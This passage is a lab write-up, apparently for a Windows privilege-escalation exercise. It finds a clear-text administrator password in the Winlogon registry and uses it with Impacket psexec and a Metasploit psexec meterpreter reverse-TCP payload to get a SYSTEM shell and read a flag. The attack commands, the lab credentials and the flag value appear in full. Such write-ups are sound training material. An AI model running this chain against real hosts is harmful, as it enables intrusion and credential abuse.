| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| KO | Med. | CREDS > WinLogon -> 1 result(s)                                 |
| OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
| OK | None | CREDS > Unattend Files                                          |
| OK | None | CREDS > GPP Passwords                                           |
| NA | None | CREDS > Vault List                                              |
| NA | None | CREDS > Vault Creds                                             |
| NA | None | HARDENING > BitLocker                                           |
| NA | Info | HARDENING > Credential Guard -> 1 result(s)                     |
| NA | Info | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | Info | MISC > Hijackable DLLs -> 3 result(s)                           |
| OK | None | SCHEDULED TASKS > Binary Permissions                            |
| OK | None | SCHEDULED TASKS > Unquoted Path                                 |
| OK | None | SERVICES > SCM Permissions                                      |
| NA | Info | SERVICES > Non-default Services -> 5 result(s)                  |
| OK | None | SERVICES > Binary Permissions                                   |
| OK | None | SERVICES > Unquoted Path                                        |
| OK | None | SERVICES > Service Permissions                                  |
| OK | None | SERVICES > Registry Permissions                                 |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
| NA | Info | USER > Groups -> 13 result(s)                                   |
| NA | Info | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Environment Variables                                    |
| NA | Info | USER > Privileges -> 2 result(s)                                |
+----+------+-----------------------------------------------------------------+
WARNING: To get more info, run this script with the option '-Extended'.

```

```
+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : 
Username : administrator
Password : hello_123321
```

Restart the Lab:

Target Machine IP Address: : 10.0.27.137

Kali Linux : 10.10.16.3

```
root@attackdefense:~# psexec.py administrator@10.0.27.137
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.0.27.137.....
[*] Found writable share ADMIN$
[*] Uploading file ocDmydGZ.exe
[*] Opening SVCManager on 10.0.27.137.....
[*] Creating service IjpP on 10.0.27.137.....
[*] Starting service IjpP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
student                  WDAGUtilityAccount       
The command completed with one or more errors.


C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

```

```
msf5 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution

Interact with a module by name or index, for example use 12 or use exploit/windows/smb/webexec

msf5 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

```

```
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set LPORT 4422
LPORT => 4422
msf5 exploit(windows/smb/psexec) > set RHOSTS 10.0.27.137
RHOSTS => 10.0.27.137
msf5 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf5 exploit(windows/smb/psexec) > set SMBPass hello_123321
SMBPass => hello_123321
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4422 
[*] 10.0.27.137:445 - Connecting to the server...
[*] 10.0.27.137:445 - Authenticating to 10.0.27.137:445 as user 'administrator'...
[*] 10.0.27.137:445 - Selecting PowerShell target
[*] 10.0.27.137:445 - Executing the payload...
[+] 10.0.27.137:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.0.27.137
[*] Meterpreter session 1 opened (10.10.16.3:4422 -> 10.0.27.137:49756) at 2023-06-28 16:42:28 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

flag位于：c:\Users\Administrator\Desktop\flag.txt

2b070a650a92129c2462deae7707b0c5

```
meterpreter > search -f flag*
Found 2 results...
    c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (551 bytes)
    c:\Users\Administrator\Desktop\flag.txt (32 bytes)
meterpreter > cat c:\\Users\\Administrator\\Desktop\\flag.txt
2b070a650a92129c2462deae7707b0c5meterpreter > 
```